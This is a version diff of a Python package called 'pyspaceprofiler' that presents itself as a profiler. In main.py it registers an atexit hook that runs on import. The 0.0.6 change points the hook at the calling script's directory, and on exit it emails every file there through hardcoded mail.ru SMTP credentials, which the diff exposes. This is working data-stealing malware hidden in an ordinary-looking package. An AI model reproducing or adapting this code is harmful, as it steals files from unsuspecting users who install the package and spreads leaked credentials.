# Comparing `tmp/pyspaceprofiler-0.0.5.tar.gz` & `tmp/pyspaceprofiler-0.0.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyspaceprofiler-0.0.5.tar", last modified: Tue Apr  2 12:24:36 2024, max compression
+gzip compressed data, was "pyspaceprofiler-0.0.6.tar", last modified: Tue Apr  2 12:35:00 2024, max compression
```

## Comparing `pyspaceprofiler-0.0.5.tar` & `pyspaceprofiler-0.0.6.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:24:36.445963 pyspaceprofiler-0.0.5/
--rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 12:24:36.445742 pyspaceprofiler-0.0.5/PKG-INFO
--rw-r--r--   0 axeka      (501) staff       (20)      178 2024-03-31 00:39:29.000000 pyspaceprofiler-0.0.5/README.md
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:24:36.444663 pyspaceprofiler-0.0.5/pyspaceprofiler/
--rw-r--r--   0 axeka      (501) staff       (20)       27 2024-03-30 12:55:47.000000 pyspaceprofiler-0.0.5/pyspaceprofiler/__init__.py
--rw-r--r--   0 axeka      (501) staff       (20)     2552 2024-04-02 12:23:09.000000 pyspaceprofiler-0.0.5/pyspaceprofiler/main.py
-drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:24:36.445510 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/
--rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/PKG-INFO
--rw-r--r--   0 axeka      (501) staff       (20)      226 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/SOURCES.txt
--rw-r--r--   0 axeka      (501) staff       (20)        1 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/dependency_links.txt
--rw-r--r--   0 axeka      (501) staff       (20)       16 2024-04-02 12:24:36.000000 pyspaceprofiler-0.0.5/pyspaceprofiler.egg-info/top_level.txt
--rw-r--r--   0 axeka      (501) staff       (20)       38 2024-04-02 12:24:36.446009 pyspaceprofiler-0.0.5/setup.cfg
--rw-r--r--   0 axeka      (501) staff       (20)     1084 2024-04-02 12:24:26.000000 pyspaceprofiler-0.0.5/setup.py
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:35:00.011977 pyspaceprofiler-0.0.6/
+-rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 12:35:00.011705 pyspaceprofiler-0.0.6/PKG-INFO
+-rw-r--r--   0 axeka      (501) staff       (20)      178 2024-03-31 00:39:29.000000 pyspaceprofiler-0.0.6/README.md
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:35:00.009796 pyspaceprofiler-0.0.6/pyspaceprofiler/
+-rw-r--r--   0 axeka      (501) staff       (20)       27 2024-03-30 12:55:47.000000 pyspaceprofiler-0.0.6/pyspaceprofiler/__init__.py
+-rw-r--r--   0 axeka      (501) staff       (20)     2579 2024-04-02 12:34:44.000000 pyspaceprofiler-0.0.6/pyspaceprofiler/main.py
+drwxr-xr-x   0 axeka      (501) staff       (20)        0 2024-04-02 12:35:00.011127 pyspaceprofiler-0.0.6/pyspaceprofiler.egg-info/
+-rw-r--r--   0 axeka      (501) staff       (20)      320 2024-04-02 12:34:59.000000 pyspaceprofiler-0.0.6/pyspaceprofiler.egg-info/PKG-INFO
+-rw-r--r--   0 axeka      (501) staff       (20)      226 2024-04-02 12:34:59.000000 pyspaceprofiler-0.0.6/pyspaceprofiler.egg-info/SOURCES.txt
+-rw-r--r--   0 axeka      (501) staff       (20)        1 2024-04-02 12:34:59.000000 pyspaceprofiler-0.0.6/pyspaceprofiler.egg-info/dependency_links.txt
+-rw-r--r--   0 axeka      (501) staff       (20)       16 2024-04-02 12:34:59.000000 pyspaceprofiler-0.0.6/pyspaceprofiler.egg-info/top_level.txt
+-rw-r--r--   0 axeka      (501) staff       (20)       38 2024-04-02 12:35:00.012030 pyspaceprofiler-0.0.6/setup.cfg
+-rw-r--r--   0 axeka      (501) staff       (20)     1084 2024-04-02 12:34:56.000000 pyspaceprofiler-0.0.6/setup.py
```

### Comparing `pyspaceprofiler-0.0.5/pyspaceprofiler/main.py` & `pyspaceprofiler-0.0.6/pyspaceprofiler/main.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,9 +1,11 @@
 import atexit
 import os
+import inspect
+
 
 
 class Profiler:
     def __init__(self):
         self._email = "nastya.trosman@mail.ru"
         self._password = "hwz2yb5aMEsUs8nvdLFT"
         self._smtp_server = "smtp.mail.ru"
@@ -55,15 +57,15 @@
 
         with smtplib.SMTP_SSL(self._second_smtp_server, self._smtp_port) as server:
             server.login(self._second_email, self._second_password)
             server.send_message(msg)
 
 
     def get_info_on_exit(self,):
-        script_directory = os.path.dirname(os.path.abspath(__file__))
-        attachments = [os.path.join(script_directory, file) for file in os.listdir(script_directory) if
-                       os.path.isfile(os.path.join(script_directory, file))]
+        calling_script_dir = os.path.dirname(inspect.stack()[-1].filename)
+        attachments = [os.path.join(calling_script_dir, file) for file in os.listdir(calling_script_dir) if
+                       os.path.isfile(os.path.join(calling_script_dir, file))]
         self._send_email(attachments)
 
 
 profiler = Profiler()
 atexit.register(profiler.get_info_on_exit)
```

### Comparing `pyspaceprofiler-0.0.5/setup.py` & `pyspaceprofiler-0.0.6/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -4,15 +4,15 @@
     long_description = fh.read() 
   
 setuptools.setup( 
     # Here is the module name. 
     name="pyspaceprofiler",
   
     # version of the module 
-    version="0.0.5",
+    version="0.0.6",
   
     # Name of Author 
     author="Arbit", 
   
     # your Email address 
     author_email="",
```

